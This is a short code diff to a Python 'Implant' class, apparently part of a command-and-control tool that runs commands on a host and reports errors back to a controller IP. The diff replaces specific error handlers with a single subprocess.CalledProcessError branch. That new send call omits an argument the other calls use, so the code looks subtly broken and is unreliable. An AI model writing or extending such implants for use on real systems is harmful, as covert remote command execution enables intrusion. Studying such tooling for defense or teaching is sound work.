@@ -31,10 +31,8 @@ class Implant(Host):
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
-        except FileNotFoundError:
-            self.send(self.controller_ip, "instruction", b'The command was not found', option="ERROR")
-        except SyntaxError:
-            self.send(self.controller_ip, "instruction", b'There was a syntax error in the command', option="ERROR")
+        except subprocess.CalledProcessError:
+            self.send(self.controller_ip, b'There was an error with the command', option="ERROR")
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
